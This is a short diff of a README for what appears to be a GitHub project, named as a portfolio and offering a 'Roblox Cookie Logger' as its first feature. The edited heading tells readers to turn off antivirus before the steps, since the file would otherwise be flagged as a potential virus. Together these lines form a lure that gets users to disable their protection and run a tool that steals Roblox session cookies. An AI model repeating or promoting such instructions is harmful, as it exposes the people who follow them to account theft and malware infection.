@@ -2,7 +2,7 @@
 
 ![sunnytamos-portfolio-sunnytamos-portfolio-cookiethumbnail](https://user-images.githubusercontent.com/108227869/177046685-88f62629-090c-4449-9b1d-5187e8bf464e.jpg)
 
-# Before The Steps Turn Off Antivirus Or The File Will Come Out With An ERROR Or Failed To Download Potential Virus Something Like That
+# Before The Steps Turn Off Antivirus🦠 Or The File Will Come Out With An ERROR Or Failed To Download Potential Virus🦠 Something Like That⚠
 
 # Features 🛡️
 1; Roblox Cookie Logger
